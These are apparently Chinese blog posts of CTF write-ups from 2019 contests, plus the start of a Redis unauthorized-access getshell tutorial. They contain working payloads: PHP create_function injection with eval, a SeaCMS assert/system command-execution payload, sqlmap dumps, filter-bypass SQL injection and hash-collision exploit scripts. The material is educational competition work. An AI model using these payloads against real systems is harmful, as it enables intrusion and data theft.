class="line"></span><br><span class="line">   If (psw = password) Then</span><br><span class="line">   </span><br><span class="line">    MsgBox &quot;The password is correct!&quot;, vbOKOnly, &quot;密码正确&quot;</span><br><span class="line">    </span><br><span class="line">    Text1.Text = &quot;Password for next pass : &quot; &amp; getPassword(password)</span><br><span class="line">       </span><br><span class="line">   Else</span><br><span class="line">   </span><br><span class="line">    MsgBox &quot;PasswordFail!&quot;, vbOKOnly, &quot;密码错误&quot;</span><br><span class="line">    </span><br><span class="line">      </span><br><span class="line">   End If</span><br><span class="line">   </span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure></p>
+<p>是vb语言，去补了一下基础看懂了一些，写个python脚本代替运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def getpassword(str):</span><br><span class="line">	restring = &apos;&apos;</span><br><span class="line">	i = 1</span><br><span class="line">	while i&lt;=len(str):</span><br><span class="line">		restring = restring + str[i-1]</span><br><span class="line">		i = i + (i%5)</span><br><span class="line">	return restring</span><br><span class="line">Dictionary = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot;</span><br><span class="line">password = getpassword(Dictionary)</span><br><span class="line">password = getpassword(password)</span><br><span class="line">print password</span><br></pre></td></tr></table></figure>
+<p>得到解压密码:VmH0wW3DZalBnmmSalV1SYSGRr1r3jVYcFrHWkUUlhljkFzCbXaEKyaVJymT1FlVTVskVWhGtonaGU2WWGhVXYol1WVI1F2odFuk</p>
+<p>解压后查看string即可得到flag</p>
+<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">if(isset($_GET[&apos;action&apos;])) &#123; </span><br><span class="line">    $action = $_GET[&apos;action&apos;]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;action&apos;]))&#123; </span><br><span class="line">    $arg = $_GET[&apos;arg&apos;]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    $action($arg,&apos;&apos;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一看就是p牛的题，只有一个地方改动了，就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$action($arg,&apos;&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>根据匿名函数规则，在下分析规律写了如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=%5ccreate_function&amp;arg=)&#123;&#125;;phpinfo();\*</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/04/06/AWfa0P.jpg" alt="image"><br>得到回显，最后写如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=%5ccreate_function&amp;arg=)&#123;&#125;;eval($_REQUEST[%27sky%27]);/*&amp;sky=echo%20file_get_contents(%22./Th1s_1S_F1a9_Hav3_Fun%22);</span><br></pre></td></tr></table></figure></p>
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>代码审计题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&apos;flag.php&apos;);</span><br><span class="line">$str1 = @$_GET[&apos;str1&apos;];</span><br><span class="line">$str2 = @$_GET[&apos;str2&apos;];</span><br><span class="line">$str3 = @$_GET[&apos;str3&apos;];</span><br><span class="line">$str4 = @$_GET[&apos;str4&apos;];</span><br><span class="line">$str5 = (string)@$_POST[&apos;str5&apos;];</span><br><span class="line">$str6 = (string)@$_POST[&apos;str6&apos;];</span><br><span class="line">$str7 = (string)@$_POST[&apos;str7&apos;];</span><br><span class="line">if( $str1 == $str2 )&#123;</span><br><span class="line">    die(&apos;str1 OR Sstr2 no no no&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    die(&apos;step 1 fail&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if( $str3 == $str4 )&#123;</span><br><span class="line">    die(&apos;str3 OR str4 no no no&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    die(&apos;step 2 fail&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 )&#123;</span><br><span class="line">    die(&apos;str5 OR str6 OR str7 no no no&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123;</span><br><span class="line">    die(&apos;step 3 fail&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!($_POST[&apos;a&apos;]) and !($_POST[&apos;b&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;come on!&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[&apos;a&apos;];</span><br><span class="line">$b = $_POST[&apos;b&apos;];</span><br><span class="line">$m = $_GET[&apos;m&apos;];</span><br><span class="line">$n = $_GET[&apos;n&apos;];</span><br><span class="line"></span><br><span class="line">if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) </span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;a OR b fail!&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) </span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;m OR n fail&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str8 = hash(&apos;md5&apos;, $a, false);</span><br><span class="line">$str9 = strtr(hash(&apos;md5&apos;, $b, false), $m, $n);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;p&gt;str8 : $str8&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;p&gt;str9 : $str9&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;You&apos;re great,give you flag:&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>题目思路分析：</p>
+<ul>
+<li>str1,str2,str3,str4可以用md5数组漏洞绕过</li>
+<li>str5,str6,str7因为加上了String,无法数组漏洞，这里用md5三个碰撞绕过， <a href="https://natmchugh.blogspot.com/2014/11/three-way-md5-collision.html" target="_blank" rel="noopener">https://natmchugh.blogspot.com/2014/11/three-way-md5-collision.html</a></li>
+</ul>
+<p>这里有现成的三个md5一样的文件，也可从github爆破工具碰撞<br>工具地址:</p>
+<p><a href="https://github.com/thereal1024/python-md5-collision" target="_blank" rel="noopener">https://github.com/thereal1024/python-md5-collision</a></p>
+<ul>
+<li>a为大写字母，b为数纯字且长度为6，m，n长度小于4<br>str8为a hash加密后的值，str9为b hash加密后，把m替换为n,要求$str8== $str9。还是用的弱类型。（这里有个注意点，0e相等后面都必须是纯数字）<br>exp:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line"># def md5(str):</span><br><span class="line"># 	p = hashlib.md5(str).hexdigest()</span><br><span class="line"># 	return p</span><br><span class="line"># for i in range(1,999999):</span><br><span class="line"># 	if md5(str(i))[0:2] == &quot;0e&quot;:</span><br><span class="line"># 		if &apos;a&apos; not in md5(str(i))[2:]:</span><br><span class="line"># 			if &apos;c&apos; not in md5(str(i))[2:]:</span><br><span class="line"># 				if &apos;d&apos; not in md5(str(i))[2:]:</span><br><span class="line"># 					print i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = &apos;http://xxxxxxxxxxxx&apos;</span><br><span class="line">url_get = url + &apos;?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4&amp;m=f&amp;n=1&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str5 = open(&apos;./white.jpg.coll&apos;,&apos;r&apos;).read()</span><br><span class="line">str6 = open(&apos;./black.jpg.coll&apos;,&apos;r&apos;).read()</span><br><span class="line">str7 = open(&apos;./brown.jpg.coll&apos;,&apos;r&apos;).read()</span><br><span class="line"></span><br><span class="line">a = &apos;QNKCDZO&apos;</span><br><span class="line">b = &apos;965253&apos;</span><br><span class="line">data = &#123;&apos;str5&apos;:str5,&apos;str6&apos;:str6,&apos;str7&apos;:str7,&apos;a&apos;:a,&apos;b&apos;:b&#125;</span><br><span class="line">res = requests.post(url_get,data=data)</span><br><span class="line">print res.content</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://s2.ax1x.com/2019/04/09/AIMStU.jpg" alt="image"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-风筝writewp" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/03/30/风筝writewp/" class="article-date">
+  	<time datetime="2019-03-30T08:18:54.905Z" itemprop="datePublished">2019-03-30</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="2019上海嘉韦思杯线上赛writeup"><a href="#2019上海嘉韦思杯线上赛writeup" class="headerlink" title="2019上海嘉韦思杯线上赛writeup"></a>2019上海嘉韦思杯线上赛writeup</h2><p>估计是第一届的原因，比赛比较水，随便做做写了wp交上去</p>
+<h3 id="土肥原贤二"><a href="#土肥原贤二" class="headerlink" title="土肥原贤二"></a>土肥原贤二</h3><p>用sqlmap工具直接跑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://47.103.43.235:81/quest/web/a/index.php?gid=1&quot; -p &quot;gid&quot; --dbs</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://47.103.43.235:81/quest/web/a/index.php?gid=1&quot; -p &quot;gid&quot; -D &quot;luozhen&quot; --tables</span><br></pre></td></tr></table></figure>
+<p>之后是表，内容最后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://47.103.43.235:81/quest/web/a/index.php?gid=1&quot; -p &quot;gid&quot; -D &quot;luozhen&quot; -T &quot;flag&quot; -C &quot;flag&quot; --dump</span><br></pre></td></tr></table></figure>
+<p>flag{20_welcome_19}</p>
+<h3 id="死亡真相"><a href="#死亡真相" class="headerlink" title="死亡真相"></a>死亡真相</h3><p>下载后是个wav文件，猜想是音频隐写，放入Audacity，</p>
+<p>查看频普图得到flag：85a9d4517d4725_b9_8cbc9fd_554216<br>但答案不对，思考很久看了文件属性发现多次有0</p>
+<p>便将_替换为0 ：85a9d4517d47250b908cbc9fd0554216</p>
+<p>再由md5解密可得flag{hsd132456}</p>
+<h3 id="吴佩孚"><a href="#吴佩孚" class="headerlink" title="吴佩孚"></a>吴佩孚</h3><p>base64解码后控制台跑一下</p>
+<h3 id="日军空袭"><a href="#日军空袭" class="headerlink" title="日军空袭"></a>日军空袭</h3><p>不断地base64解码后，再栅栏解密</p>
+<h3 id="戴星炳"><a href="#戴星炳" class="headerlink" title="戴星炳"></a>戴星炳</h3><p>写个脚本跑一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url =&apos;http://47.103.43.235:82/web/a/index.php&apos;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">text = r.get(url).text</span><br><span class="line">cal = str(re.findall(&quot;&lt;/p&gt;&lt;p&gt;(.*?)&lt;/p&gt;&quot;,text))[3:-2]</span><br><span class="line"># print cal</span><br><span class="line">ans = eval(cal)</span><br><span class="line"># print ans</span><br><span class="line">data= &#123;&quot;result&quot;: ans&#125;</span><br><span class="line">r1 = r.post(url,data=data)</span><br><span class="line">print r1.content</span><br></pre></td></tr></table></figure></p>
+<p>flag{Y0U_4R3_3o_F4ST!}</p>
+<h3 id="大美晚报"><a href="#大美晚报" class="headerlink" title="大美晚报"></a>大美晚报</h3><p>打开后是个二维码，扫描一下没发现flag</p>
+<p>保存到本地，binwalk了一下发现压缩包，里面有key.txt,提示是管理员QQ</p>
+<p>于是用暴力破解工具Ziperello从九位数起，得到密码674290437，输入后得flag{d6@YX$_m^aa0}</p>
+<h3 id="潘汉年"><a href="#潘汉年" class="headerlink" title="潘汉年"></a>潘汉年</h3><p>得到密文为 bg[<code>sZ*Zg&#39;dPfP</code>VM_SXVd</p>
+<p>想起有点像实验吧的变异凯撒密码，脚本为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = &quot;bg[`sZ*Zg&apos;dPfP`VM_SXVd&quot;</span><br><span class="line">res =&quot;&quot;</span><br><span class="line">j = 4</span><br><span class="line">for i in s:</span><br><span class="line">    res += chr(ord(i) + j)</span><br><span class="line">    j += 1</span><br><span class="line">print res</span><br></pre></td></tr></table></figure></p>
+<p>flag{c4es4r_variation}</p>
+<h3 id="袁殊"><a href="#袁殊" class="headerlink" title="袁殊"></a>袁殊</h3><p>是个rsa256，找了个脚本如下<br>1.py:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line"></span><br><span class="line">pub = RSA.importKey(open(&apos;gy.key&apos;).read())</span><br><span class="line">n = long(pub.n)</span><br><span class="line">e = long(pub.e)</span><br><span class="line">print n</span><br><span class="line">print e</span><br></pre></td></tr></table></figure></p>
+<p>2.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line">import sys</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(1024)</span><br><span class="line">keypair.p = 273821108020968288372911424519201044333          </span><br><span class="line">keypair.q = 280385007186315115828483000867559983517      </span><br><span class="line">keypair.e = 65537                                            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = long((keypair.p-1) * (keypair.q-1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = 1</span><br><span class="line">while (True):</span><br><span class="line">  x = (Qn * i ) + 1</span><br><span class="line">  if (x % keypair.e == 0):</span><br><span class="line">    keypair.d = x / keypair.e</span><br><span class="line">    break</span><br><span class="line">  i += 1</span><br><span class="line"></span><br><span class="line">private = open(&apos;private.pem&apos;,&apos;w&apos;)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure></p>
+<h3 id="76号"><a href="#76号" class="headerlink" title="76号"></a>76号</h3><p>打开后是个re2题<br>re2是一个输入，然后进入一个大switch语块，从1-z，刚开始没有啥头绪，然后那个v2变量引起了我的注意，我需要return 1最后。然后让v2每次加一。穷举即可得到flag</p>
+<h3 id="晴气庆胤"><a href="#晴气庆胤" class="headerlink" title="晴气庆胤"></a>晴气庆胤</h3><p>想起强网杯的md5碰撞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import requests</span><br><span class="line">str1=&apos;d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70&apos;</span><br><span class="line">str1 = binascii.a2b_hex(str1)</span><br><span class="line">str2=&apos;d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70&apos;</span><br><span class="line">str2 = binascii.a2b_hex(str2)</span><br><span class="line">url = &apos;http://47.103.43.235:85/a/&apos;</span><br><span class="line">header = &#123;</span><br><span class="line">&apos;Cookie&apos;: &apos;PHPSESSID=v1j13robthdta88p9pl3urrhp4&apos;</span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">&apos;param1&apos;:str1,</span><br><span class="line">&apos;param2&apos;:str2</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,headers=header,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<p>flag{MD5@_@success}</p>
+<h3 id="梅津美治郎"><a href="#梅津美治郎" class="headerlink" title="梅津美治郎"></a>梅津美治郎</h3><p>打开后是个逆向题re1</p>
+<p>分成两个部分</p>
+<p>第一部分在ida中明文<br>第二部分是一个异或通过动态调试可以看到，逆还原得flag{r0b0RUlez!_w3lld0ne}</p>
+<p>下划线是看到群里提示才写的</p>
+<h3 id="冈村宁次"><a href="#冈村宁次" class="headerlink" title="冈村宁次"></a>冈村宁次</h3><p>看url想了好久才发现是base64逆序，来回转化很麻烦，便写了个脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line">import base64</span><br><span class="line">s = &quot;&quot; //你要测试的内容 </span><br><span class="line">s1 = base64.b64encode(s)</span><br><span class="line">print s1[::-1]</span><br></pre></td></tr></table></figure></p>
+<p>经过测试，select 空格都被过滤了，不过可以双写，* *\绕过</p>
+<p>最终的payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.43.235:83/web/a/index.php?id=jcWYsZ2LqoyLt9mcm9iKq8SKnFGbmhCdhNmbvN2XwV3bydGL1wCNsMDLywSMvoiKvQ3YgUGblN3LqoyLu9Wag4WdvoiKvETL</span><br></pre></td></tr></table></figure></p>
+<p>flag{s9li_1s_s0_e4sY}</p>
+<h3 id="作战计划"><a href="#作战计划" class="headerlink" title="作战计划"></a>作战计划</h3><p>是个seacms<br>找到一个getshell文章</p>
+<p><a href="https://balis0ng.com/post/dai-ma-shen-ji/2016-11-02" target="_blank" rel="noopener">https://balis0ng.com/post/dai-ma-shen-ji/2016-11-02</a></p>
+<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.43.235:84/search.php?searchtype=5&amp;tid=0&amp;year=23334444);assert($_POST[1]);//</span><br></pre></td></tr></table></figure></p>
+<p>post:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&apos;cat //flag.txt&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>flag{!!seacms_@@} </p>
+<h3 id="池步洲"><a href="#池步洲" class="headerlink" title="池步洲"></a>池步洲</h3><p>查看源代码发现index.phps，下载下来审计<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;********&apos;;</span><br><span class="line">if (isset($_POST[&apos;name&apos;]) and isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">	if ($_POST[&apos;name&apos;] == $_POST[&apos;password&apos;])</span><br><span class="line">		print &apos;name and password must be diffirent&apos;;</span><br><span class="line">	else if (sha1($_POST[&apos;name&apos;]) === sha1($_POST[&apos;password&apos;]))</span><br><span class="line">		die($flag);</span><br><span class="line">	else print &apos;invalid password&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>火狐hackbar构造post:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name[]=1111&amp;password[]=2222</span><br></pre></td></tr></table></figure></p>
+<p>flag{Y0u_just_br0ke_sha1}</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-redis" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/03/25/redis/" class="article-date">
+  	<time datetime="2019-03-25T05:32:39.745Z" itemprop="datePublished">2019-03-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="redis-未授权访问漏洞-getshell"><a href="#redis-未授权访问漏洞-getshell" class="headerlink" title="redis 未授权访问漏洞 getshell"></a>redis 未授权访问漏洞 getshell</h2><p>这里记录一下redis未授权访问漏洞的getshell，方便日后回顾</p>
+<p>redis是一个key-value型数据库，信息以键对应值的关系存储在内存中。6379是redis的默认端口。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>下载redis，修改redis配置文件redis.conf中的几个地方</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1前面需要加上注释符，保证远程ip可以访问redis数据库,也可以改成 bind 0.0.0.0</span><br><span class="line">2.protected-mode要修改为no，否则远程连接数据库的ip执行不了数据库语句</span><br></pre></td></tr></table></figure>
+<p>启动redis服务器(当前redis的文件夹)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis.conf</span><br></pre></td></tr></table></figure></p>
+<p>攻击者:(可以自己虚拟机搭建)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h xxx目标ip -p 6379</span><br></pre></td></tr></table></figure></p>
+<p>或者不用redis，可用telnet等连接命令</p>
+<p>redis配置的几个关键：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir 指定的是redis的“工作路径”，之后生成的RDB和AOF文件都会存储在这里。</span><br><span class="line">dbfilename RDB文件名，默认为“dump.rdb”</span><br><span class="line">appendonly 是否开启AOF</span><br><span class="line">appendfilename AOF文件名，默认为“appendonly.aof”</span><br><span class="line">appendfsync AOF备份方式：always、everysec、no</span><br></pre></td></tr></table></figure>
+<h3 id="利用redis未授权访问写webshell"><a href="#利用redis未授权访问写webshell" class="headerlink" title="利用redis未授权访问写webshell"></a>利用redis未授权访问写webshell</h3><p>条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）redis服务器上有web服务器</span><br><span class="line">（2）web根目录已知</span><br></pre></td></tr></table></figure></p>
